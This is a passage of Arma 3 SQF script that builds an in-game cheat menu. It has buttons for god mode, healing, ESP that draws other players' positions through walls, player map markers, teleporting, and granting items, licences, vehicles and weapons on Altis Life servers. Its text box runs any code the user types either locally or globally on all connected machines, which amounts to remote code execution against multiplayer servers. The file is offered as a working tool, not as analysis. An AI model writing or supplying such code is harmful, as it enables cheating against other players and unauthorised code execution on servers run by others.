			_back ctrlSetPosition [-0.675,-0.28,0.55,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_6", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.6715,-0.28,0.01,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_7", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.675,0.4,0.0015,0.68];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_8", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.675,-0.28,0.0015,0.68];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_9", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [1.725,-0.28,0.0015,0.68];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_10", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [1.725,0.4,0.0015,0.683];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_11", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.125,-0.28,0.0015,0.68];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_12", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.125,0.4,0.0015,0.68];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_13", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [1.175,-0.28,0.0015,0.68];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_14", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [1.175,0.4,0.0015,0.68];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_15", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.675,0.394184,0.55,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_16", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.675,0.4,0.55,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_17", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.675,1.08,0.55,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_18", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [1.175,0.4,0.55,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_19", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [1.175,1.08,0.55,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_20", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [1.175,0.394184,0.55,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_21", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [1.175,-0.28,0.55,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_22", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.1125,-0.28,0.0015,1.36];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_23", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [1.1625,-0.28,0.0015,1.36];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_24", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.1125,-0.28,1.275,0.0015];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_25", _back];

			_back = _display ctrlCreate ["IGUIBack", -1];

			_back ctrlSetPosition [-0.1125,1.08,1.275,0.0025];
			_back ctrlSetBackgroundColor [0.6,0,0,1];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["IGUIBack_26", _back];


			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [-0.2125,1.2,0.25,0.06];
			_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.45];
			_back ctrlSetText "Local";
			_back ctrlCommit 0.0;
			_back buttonSetAction '_edit = uiNamespace getVariable "RscEdit"; _text = ctrlText _edit; call compile format ["%1",_text];';

			uiNamespace setVariable ["RscButtonMenu_1", _back];

			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [0.3375,1.2,0.25,0.06];
			_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			_back ctrlSetText "Get File";
			_back ctrlCommit 0.0;
			_back buttonSetAction '[] spawn O_fnc_ArmAFile';

			uiNamespace setVariable ["RscButtonMenu_2", _back];

			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [1.125,1.2,0.25,0.06];
			_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			_back ctrlSetText "Global";
			_back ctrlCommit 0.0;
			_back buttonSetAction '_edit = uiNamespace getVariable "RscEdit"; _text = ctrlText _edit; call compile format ["[{%1},true] call O_fnc_ArmA",_text];';

			uiNamespace setVariable ["RscButtonMenu_3", _back];

			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [0.5125,0.72,0.206079,0.0460789];
			_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			_back ctrlSetText "Heal";
			_back ctrlCommit 0.0;
			_back buttonSetAction 'player setVehicleArmor 1; vehicle player setVehicleArmor 1; vehicle player setFuel 1000;';

			uiNamespace setVariable ["RscButtonMenu_4", _back];

			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [0.5125,0.66,0.206079,0.0460789];

			if (isNil "O_fnc_GodButton")then{
				_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			}else{
				_back ctrlSetBackgroundColor [0.4,0.98,0.02,0.65];
			};
			_back ctrlSetText "GodMode";
			_back ctrlCommit 0.0;
			_back buttonSetAction 'if (isNil "O_fnc_GodButton")then{player allowDamage false; O_fnc_GodButton = true; (uiNamespace getVariable "RscButtonMenu_5") ctrlSetBackgroundColor [0.4,0.98,0.02,0.65];}else{player allowDamage true; O_fnc_GodButton = nil; (uiNamespace getVariable "RscButtonMenu_5") ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];};';

			uiNamespace setVariable ["RscButtonMenu_5", _back];

			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [0.5125,0.78,0.206079,0.0460789];
			if (isNil "O_fnc_DummyID")then{
				_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			}else{
				_back ctrlSetBackgroundColor [0.4,0.98,0.02,0.65];
			};
			_back ctrlSetText "Second Person";
			_back ctrlCommit 0.0;
			_back buttonSetAction 'if (isNil "O_fnc_DummyID")then{(uiNamespace getVariable "RscButtonMenu_6") ctrlSetBackgroundColor [0.4,0.98,0.02,0.65]; [] spawn O_fnc_CPerson}else{_player = O_fnc_DummyID; selectPlayer _player; vehicle _player switchCamera "EXTERNAL"; O_fnc_DummyID = nil; (uiNamespace getVariable "RscButtonMenu_6") ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];};';

			uiNamespace setVariable ["RscButtonMenu_6", _back];

			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [0.5125,0.84,0.206079,0.0460789];
			if (isNil "O_fnc_MapMarkerButton")then{
				_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			}else{
				_back ctrlSetBackgroundColor [0.4,0.98,0.02,0.65];
			};
			_back ctrlSetText "Map Marker";
			_back ctrlCommit 0.0;
			_back buttonSetAction '[] spawn{
				if (isNil "O_fnc_MapMarkerButton")then{
						(uiNamespace getVariable "RscButtonMenu_7") ctrlSetBackgroundColor [0.4,0.98,0.02,0.65];

						O_fnc_MapMarkerButton = true;
						O_fnc_Markers = [];

						while{!isNil "O_fnc_MapMarkerButton"} do {
							{
							   if !(_x in allUnits) then {
							   deleteMarkerLocal str _x;
							   };
							} forEach O_fnc_Markers;

							O_fnc_Markers = [];
							{
								if(alive _x && isplayer _x) then {
									deleteMarkerLocal str _x;

									_playmarksss = createMarkerLocal [str _x,getpos _x];
									_playmarksss setMarkerTypeLocal "waypoint";
									_playmarksss setMarkerPosLocal getPos _x;
									_playmarksss setMarkerSizeLocal [0.8,0.8];
									_playmarksss setMarkerTextLocal format["%1 - %2",name _x, side _x, netID _x];
									_playmarksss setMarkerColorLocal ("ColorGreen");
									O_fnc_Markers = O_fnc_Markers + [_x];
								};
							} forEach allUnits;
							sleep 0.5;
						};
					}else{
						{
						  deleteMarkerLocal str _x;
						} forEach O_fnc_Markers;
						O_fnc_MapMarkerButton = nil;
						(uiNamespace getVariable "RscButtonMenu_7") ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
					};
				};
			';

			uiNamespace setVariable ["RscButtonMenu_7", _back];

			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [0.5125,0.9,0.206079,0.0460789];
			if (isNil "O_fnc_ESPButton")then{
				_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			}else{
				_back ctrlSetBackgroundColor [0.4,0.98,0.02,0.65];
			};
			_back ctrlSetText "ESP";
			_back ctrlCommit 0.0;
			_back buttonSetAction '
				if (isNil "O_fnc_ESPButton")then{
					O_fnc_ESPButton = true;
					(uiNamespace getVariable "RscButtonMenu_8") ctrlSetBackgroundColor [0.4,0.98,0.02,0.65];

					onEachFrame {
						{
							if(side _x != side player && ((player distance _x) < 700) && isPlayer _x) then {
									drawIcon3D ["", [1,0,0,0.7], position _x, 1, 1, 45,name _x, 1, 0.03, "PuristaBold"]
							}else{
								if (alive _x && ((player distance _x) < 700) && isPlayer _x) then{
									drawIcon3D ["", [0,1,0.5,0.4], position _x, 1, 1, 45,name _x, 1, 0.03, "PuristaBold"]
								};
							};
						} foreach allUnits;

						_mans = nearestobjects [player,["man"],100];

						{
							if(alive _x && ((player distance _x) < 700) && isPlayer _x) then {
								if(side _x != side player) then {
									if(player distance _x < 5 && _x iskindof "man" && side _x != civilian && isPlayer _x) then {
										drawLine3D [[getposatl player select 0, getposatl player select 1, 1], _x, [1,0.2,0.3,(abs((((player distance _x)) - 100)/100))]]
									}else{
										drawLine3D [[getposatl player select 0, getposatl player select 1, 1], _x, [1,0,0,(abs((((player distance _x)) - 100)/100))]]
									};
								}else{
									drawLine3D [[getposatl player select 0, getposatl player select 1, 1], _x, [0,1,0,(abs((((player distance _x)) - 100)/100))]]};
							};
						}foreach _mans;
					};
				}else{
					onEachFrame {};
					O_fnc_ESPButton = nil;
					(uiNamespace getVariable "RscButtonMenu_8") ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
				};
			';

			uiNamespace setVariable ["RscButtonMenu_8", _back];

			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [0.5125,0.96,0.206079,0.0460789];
			_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			_back ctrlSetText "Teleport";
			_back ctrlCommit 0.0;
			_back buttonSetAction '
				disableSerialization;
				closeDialog 0;
				if (isNil "jgdfk1") then
				{
					jgdfk1 =
					{
						Vehicle Player setpos _this;
						systemchat format ["Teleported to: %1", _this];
					};
					jgdfk2 =
					{
						_gsddf = _this select 0;
						{
							_gsddf drawIcon ["\A3\ui\data\map\markers\military\Start_CA.paa", if (_x == player) then {[0,0,1,1]} else {[1,0,0,1]}, getPos _x, ((1 - ctrlMapScale _gsddf) max 0.2)*30, ((1 - ctrlMapScale _gsddf) max 0.2)*30, getDir _x, "herro", 2];
						} forEach (entities "SurvivorBase");
					};
				};
				createDialog "RscDisplayMainMap";
				_map = (findDisplay 12) displayCtrl 51;
				_map ctrlAddEventhandler ["mousebuttondblclick","((_this select 0) posScreenToWorld [_this select 2, _this select 3]) spawn jgdfk1"];
				_map ctrlAddEventHandler ["Draw", "_this call jgdfk2"];
				for "_i" from 0 to 9999 do
				{
					if (_i != 51) then
					{
						((findDisplay 12) displayCtrl _i) ctrlShow false;
					};
				};

			';

			uiNamespace setVariable ["RscButtonMenu_9", _back];

			_back = _display ctrlCreate ["RscButtonMenu", -1];

			_back ctrlSetPosition [0.5125,1.02,0.206079,0.0460789];
			_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			_back ctrlSetText "Refresh";
			_back ctrlCommit 0.0;
			_back buttonSetAction '
								disableserialization;
							   _ctrl = uiNamespace getVariable "RscListbox_6";
							   if(!isNull _ctrl) then {
								   _ctrl spawn O_fnc_PlayerList;
							   };
							';

			uiNamespace setVariable ["RscButtonMenu_10", _back];


			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [-0.1,-0.26,0.3125,0.04];
			_back ctrlSetText format ["Name: %1",name player];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_1", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [-0.1,-0.2,0.425,0.04];
			_back ctrlSetText format ["PlayerID: %1",str (getPlayerUID player)];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_2", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [-0.1,-0.14,0.3125,0.04];
			_back ctrlSetText format ["OwnerID: %1",owner player];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_3", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [0.225,-0.24,0.2875,0.04];
			_back ctrlSetText format ["Coded by: Meh"];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_4", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [0.8375,-0.14,0.5,0.04];
			_frames = round(diag_fpsmin) + 10;
			_back ctrlSetText format ["FPS: %1",_frames];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_5", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [-0.1,-0.08,0.3125,0.04];
			_back ctrlSetText format ["netID: %1",netID player];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_6", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [0.8375,-0.08,0.3125,0.04];
			_back ctrlSetText format ["Server: %1",Servername];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_7", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [0.225,-0.45,0.6,0.14];
			_back ctrlSetStructuredText parseText format[""];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_8", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [0.5675,-0.24,0.2875,0.04];
			_back ctrlSetText format ["Functions: 476"];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_9", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [0.8375,-0.2,0.3125,0.04];
			_back ctrlSetText format ["Players: %1",count(playableUnits)];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_10", _back];

			_back = _display ctrlCreate ["RscStructuredText", -1];

			_back ctrlSetPosition [0.8375,-0.26,0.3125,0.04];

			_damage = getDammage player;

			_back ctrlSetText format ["Health: %1",(((1-_damage)*100)-((1-_damage)*100 mod 1))];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscStructuredText_11", _back];


			_back = _display ctrlCreate ["RscEdit", -1];

			_back ctrlSetPosition [-0.207941,1.13797,1.58108,0.0498683];
			_back ctrlSetBackgroundColor [0.4,0.89,0.94,0.65];
			_back ctrlSetTextColor [0,0,0,0.5];
			_back ctrlSetText format ["Enter the Code/File you want to execute/download.."];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscEdit", _back];

			_back = _display ctrlCreate ["RscCombo", -1];

			_back ctrlSetPosition [0.7625,0.64,0.3875,0.04];
			_back ctrlCommit 0.0;
			_back call O_fnc_Subs;
			_back ctrlAddEventHandler ["LBSelChanged",{_this spawn O_fnc_SubsSelected;}];

			uiNamespace setVariable ["RscCombo", _back];


			_back = _display ctrlCreate ["RscTree", -1];

			_back ctrlSetPosition [1.175,-0.28,0.55,0.674184];
			_back ctrlSetBackgroundColor [0,0,0,0.2];
			_back ctrlCommit 0.0;
			_back call O_fnc_Vehicle;
			_back ctrlAddEventHandler ["TreeDblClick",{disableSerialization; (_this select 0) spawn O_fnc_VehicleDbc}];

			uiNamespace setVariable ["RscListbox_1", _back];

			_back = _display ctrlCreate ["RscTree", -1];

			_back ctrlSetPosition [1.175,0.4,0.55,0.68];
			_back ctrlSetBackgroundColor [0,0,0,0.2];
			_back ctrlCommit 0.0;
			_back call O_fnc_altisLifeLicenses;
			_back ctrlAddEventHandler ["TreeDblClick",{disableSerialization; (_this select 0) spawn O_fnc_altisLifeLicensesDbc}];

			uiNamespace setVariable ["RscListbox_2", _back];

			_back = _display ctrlCreate ["RscTree", -1];

			_back ctrlSetPosition [-0.675,0.4,0.55,0.68];
			_back ctrlSetBackgroundColor [0,0,0,0.2];
			_back ctrlCommit 0.0;
			_back call O_fnc_altisLifeItems;
			_back ctrlAddEventHandler ["TreeDblClick",{disableSerialization; (_this select 0) spawn O_fnc_altisLifeItemsDbc}];

			uiNamespace setVariable ["RscListbox_3", _back];

			_back = _display ctrlCreate ["RscTree", -1];

			_back ctrlSetPosition [-0.675,-0.28,0.55,0.674184];
			_back ctrlSetBackgroundColor [0,0,0,0.2];
			_back ctrlCommit 0.0;
			_back call O_fnc_Waffen;
			_back ctrlAddEventHandler ["TreeDblClick",{disableSerialization; (_this select 0) spawn O_fnc_WaffenDbc}];

			uiNamespace setVariable ["RscListbox_4", _back];

			_back = _display ctrlCreate ["RscListbox", -1];

			_back ctrlSetPosition [-0.1,0,1.25,0.64];
			_back ctrlSetBackgroundColor [0,0,0,0.2];
			_back ctrlCommit 0.0;

			uiNamespace setVariable ["RscListbox_5", _back];

			_back = _display ctrlCreate ["RscTree", -1];

			_back ctrlSetPosition [-0.1,0.66,0.607941,0.404053];
			_back ctrlSetBackgroundColor [0.99,0.97,0.78,0.25];
			_back ctrlCommit 0.0;
			_back call O_fnc_PlayerList;

			uiNamespace setVariable ["RscListbox_6", _back];
		};
	};
};

O_fnc_SubLoad = {
	disableserialization;
	_ctrl = _this select 0;
	_array = _this select 1;

	lbClear _ctrl;
	{
		_isToggle = _x select 3;
		_toggle = _x select 2;
		_color = [0,0.45,0.84,1];
		if(_isToggle) then {
			_value = call compile format["if(isNil '%1') then {%1 = false;};%1",_toggle];
			if(_value) then {
				_color = [0,1,0,1];
			} else {
				_color = [1,0,0,1];
			};
		};

		_ctrl lbAdd (_x select 0);
		_ctrl lbSetColor [_forEachIndex,_color];
	} forEach _array;
};

O_fnc_SubsSelected = {
	disableserialization;
	_index = _this select 1;
	_item = O_fnc_SubOrder select _index;
	_array = _item select 1;
	_ctrl = uiNamespace getVariable "RscListbox_5";
	[_ctrl,_array] call O_fnc_SubLoad;
};

O_fnc_Vehicle = {
	disableSerialization;
	_ctrl = _this;

	O_fnc_Cars = [];
	_cfg = configFile >> "cfgVehicles";

	for "_i" from 0 to count (_cfg)-1 do {
		if(isNull _ctrl) exitWith {O_fnc_Cars = nil;};
		_config = _cfg select _i;
		if(isClass _config)then{
			_cname = configName _config;
			_scope = getNumber(_config >> "scope");
			_pic = getText(_config >> "picture");
			_name = getText(_config >> "displayName");

			if (_scope == 2 && (_cname isKindOf "LandVehicle" || _cname isKindOf "Air" || _cname isKindOf "Ship") && _pic !="" &&!((_cname isKindOf"ParachuteBase") || (_cname isKindOf"BIS_Steerable_Parachute"))) then {
				O_fnc_Cars = O_fnc_Cars + [[_name,_cname,_pic]];
			};
		};
	};

	{
		_array = _x;

		_text = _array select 0;
		_data = _array select 1;
		_image = _array select 2;

		_index = _ctrl tvAdd[[],_text];
		_ctrl tvSetPicture [[_index],_image];
		_ctrl tvSetData [[_index],_data];
	} forEach O_fnc_Cars;
};

O_fnc_altisLifeItems = {
	disableserialization;
	_ctrl = _this;

	if (O_fnc_Modus == "AltisLife")then{
		O_fnc_invItems = [];

		if (!isNil "life_licenses")then{
			if (!isNil "life_inv_items")then{
				if (!isNil "life_fnc_varToStr")then{
					{
						_name = [_x] call life_fnc_varToStr;
						O_fnc_invItems = O_fnc_invItems + [[_name,_x]];
					}foreach life_inv_items;
				};
			};
		}else{
			if (!isNil "Schnitzel_inv_items")then{
				if (!isNil "Schnitzel_fnc_varToStr")then{
					{
						_name = [_x] call Schnitzel_fnc_varToStr;
						O_fnc_invItems = O_fnc_invItems + [[_name,_x]];
					}foreach Schnitzel_inv_items;
				};
			}else{
				{
					_var = getText(missionConfigFile >> "VirtualItems" >> str (_x) >> "variable");
					_name = getText(missionConfigFile >> "VirtualItems" >> str (_x) >> "displayName");
					O_fnc_invItems = O_fnc_invItems + [[_name,_var]];
				}foreach ("true" configClasses (missionConfigFile >> "VirtualItems"));
			};
		};

		{
			_array = _x;

			_text = _array select 0;
			_data = _array select 1;

			if (typeName _text == "STRING")then{
				_index = _ctrl tvAdd[[],_text];
				_ctrl tvSetData [[_index],_data];
			};
		} forEach O_fnc_invItems;
	}else{

	};
};

O_fnc_altisLifeItemsDbc= {
	disableSerialization;
	_ctrl = _this;

	_curSelArr = tvCurSel _ctrl;
	_truepath = [_curSelArr select 0];
	_data = _ctrl tvData _truepath;

	_iname = _data;

	missionNamespace setVariable[_iname,15];
};

O_fnc_altisLifeLicenses = {
	disableserialization;
	_ctrl = _this;

	if (O_fnc_Modus == "AltisLife")then{
		O_fnc_invLicenses = [];

		if (!isNil "life_licenses")then{
			if (!isNil "life_fnc_varToStr")then{
				{
					_lVar = (_x select 0);
					_name = [_lVar] call life_fnc_varToStr;
					O_fnc_invLicenses = O_fnc_invLicenses + [[_name,_lVar]];
				}foreach life_licenses;
			};
		}else{
			if (!isNil "Schnitzel_licenses")then{
				if (!isNil "Schnitzel_fnc_varToStr")then{
					{
						_lVar = (_x select 0);
						_name = [_lVar] call Schnitzel_fnc_varToStr;
						O_fnc_invLicenses = O_fnc_invLicenses + [[_name,_lVar]];
					}foreach Schnitzel_licenses;
				};
			};
		};

		{
			_array = _x;

			_text = _array select 0;
			_data = _array select 1;

			if (typeName _text == "STRING")then{
				_index = _ctrl tvAdd[[],_text];
				_ctrl tvSetData [[_index],_data];
			};
		} forEach O_fnc_invLicenses;

	}else{

	};
};

O_fnc_altisLifeLicensesDbc= {
	disableSerialization;
	_ctrl = _this;

	_curSelArr = tvCurSel _ctrl;
	_truepath = [_curSelArr select 0];
	_data = _ctrl tvData _truepath;

	_lname = _data;

	missionNamespace setVariable[_lname,true];
};

O_fnc_playerside = {
		disableSerialization;
		_object = _this;
		_side = side _object;
		_flag = "A3\ui_f\data\gui\rsc\RscDisplayMultiplayerSetup\flag_civil_ca.paa";
		if(_side == east) then {
				_flag = "A3\ui_f\data\gui\rsc\RscDisplayMultiplayerSetup\flag_opfor_ca.paa";
		};
		if(_side == west) then {
				_flag = "\A3\ui_f\data\gui\rsc\RscDisplayMultiplayerSetup\flag_bluefor_ca.paa";
		};
		if(_side == INDEPENDENT) then {
				_flag = "A3\ui_f\data\gui\rsc\RscDisplayMultiplayerSetup\flag_indep_ca.paa";
		};
		_flag;
};

O_fnc_PlayerList = {
	disableserialization;

	_ctrl = _this;
	tvClear _ctrl;
	_units = [];

	{
			if(isPlayer _x) then {player reveal _x;_units set[count(_units),_x];};
	} forEach allunits;

	{
		if(alive _x && side _x == blufor) then {
				_flag = _x call O_fnc_playerside;

				_mainIndex = _ctrl tvAdd[[],name _x];
				_ctrl tvSetPicture [[_mainIndex],_flag];

				_ctrl tvAdd[[_mainIndex],"UID: " + (getplayeruid _x)];
				_ctrl tvAdd[[_mainIndex],"NETID: " + (netid _x)];
				_wepIndex = _ctrl tvAdd[[_mainIndex],"Weapons"];
				_magIndex = _ctrl tvAdd[[_mainIndex],"Magazines"];

				{
						_text = getText(configFile >> "cfgWeapons" >> _x >> "displayName");
						_wep = _ctrl tvAdd[[_mainIndex,_wepIndex],"Name: " + _text];

						_ctrl tvAdd[[_mainIndex,_wepIndex,_wep],"Type: " + _x];
				} forEach (weapons player);
				_magInfo = [];
				_magCount = [];
				{
						if !(_x in _magInfo) then {
								_magInfo set[count(_magInfo),_x];
								_magCount set[count(_magCount),1];
						} else {
								_cnt = _magCount select (_magInfo find _x);
								_magCount set[count(_magCount),_cnt+1];
						};
				} forEach (magazines player);
				{
						_count = _magCount select _forEachIndex;
						_text = getText(configFile >> "cfgMagazines" >> _x >> "displayName");
						_wep = _ctrl tvAdd[[_mainIndex,_magIndex],"Name: " + _text];
						_ctrl tvAdd[[_mainIndex,_magIndex,_wep],"Type: " + _x];
						_ctrl tvAdd[[_mainIndex,_magIndex,_wep],"Count: " + str(_count)];
				} forEach _magInfo;
		};
	} forEach _units;

	{
		if(alive _x && side _x == opfor) then {
				_flag = _x call O_fnc_playerside;

				_mainIndex = _ctrl tvAdd[[],name _x];
				_ctrl tvSetPicture [[_mainIndex],_flag];

				_ctrl tvAdd[[_mainIndex],"UID: " + (getplayeruid _x)];
				_ctrl tvAdd[[_mainIndex],"NETID: " + (netid _x)];
				_wepIndex = _ctrl tvAdd[[_mainIndex],"Weapons"];
				_magIndex = _ctrl tvAdd[[_mainIndex],"Magazines"];

				{
						_text = getText(configFile >> "cfgWeapons" >> _x >> "displayName");
						_wep = _ctrl tvAdd[[_mainIndex,_wepIndex],"Name: " + _text];

						_ctrl tvAdd[[_mainIndex,_wepIndex,_wep],"Type: " + _x];
				} forEach (weapons player);
				_magInfo = [];
				_magCount = [];
				{
						if !(_x in _magInfo) then {
								_magInfo set[count(_magInfo),_x];
								_magCount set[count(_magCount),1];
						} else {
								_cnt = _magCount select (_magInfo find _x);
								_magCount set[count(_magCount),_cnt+1];
						};
				} forEach (magazines player);
				{
						_count = _magCount select _forEachIndex;
						_text = getText(configFile >> "cfgMagazines" >> _x >> "displayName");
						_wep = _ctrl tvAdd[[_mainIndex,_magIndex],"Name: " + _text];
						_ctrl tvAdd[[_mainIndex,_magIndex,_wep],"Type: " + _x];
						_ctrl tvAdd[[_mainIndex,_magIndex,_wep],"Count: " + str(_count)];
				} forEach _magInfo;
		};
	} forEach _units;

	{
		if(alive _x && side _x == independent) then {
				_flag = _x call O_fnc_playerside;

				_mainIndex = _ctrl tvAdd[[],name _x];
				_ctrl tvSetPicture [[_mainIndex],_flag];

				_ctrl tvAdd[[_mainIndex],"UID: " + (getplayeruid _x)];
				_ctrl tvAdd[[_mainIndex],"NETID: " + (netid _x)];
				_wepIndex = _ctrl tvAdd[[_mainIndex],"Weapons"];
				_magIndex = _ctrl tvAdd[[_mainIndex],"Magazines"];

				{
						_text = getText(configFile >> "cfgWeapons" >> _x >> "displayName");
						_wep = _ctrl tvAdd[[_mainIndex,_wepIndex],"Name: " + _text];

						_ctrl tvAdd[[_mainIndex,_wepIndex,_wep],"Type: " + _x];
				} forEach (weapons player);
				_magInfo = [];
				_magCount = [];
				{
						if !(_x in _magInfo) then {
								_magInfo set[count(_magInfo),_x];
								_magCount set[count(_magCount),1];
						} else {
								_cnt = _magCount select (_magInfo find _x);
								_magCount set[count(_magCount),_cnt+1];
						};
				} forEach (magazines player);
				{
						_count = _magCount select _forEachIndex;
						_text = getText(configFile >> "cfgMagazines" >> _x >> "displayName");
						_wep = _ctrl tvAdd[[_mainIndex,_magIndex],"Name: " + _text];
						_ctrl tvAdd[[_mainIndex,_magIndex,_wep],"Type: " + _x];
						_ctrl tvAdd[[_mainIndex,_magIndex,_wep],"Count: " + str(_count)];
				} forEach _magInfo;
		};
	} forEach _units;

	{
		if(alive _x && side _x == civilian) then {
				_flag = _x call O_fnc_playerside;

				_mainIndex = _ctrl tvAdd[[],name _x];
				_ctrl tvSetPicture [[_mainIndex],_flag];

				_ctrl tvAdd[[_mainIndex],"UID: " + (getplayeruid _x)];
				_ctrl tvAdd[[_mainIndex],"NETID: " + (netid _x)];
				_wepIndex = _ctrl tvAdd[[_mainIndex],"Weapons"];
				_magIndex = _ctrl tvAdd[[_mainIndex],"Magazines"];

				{
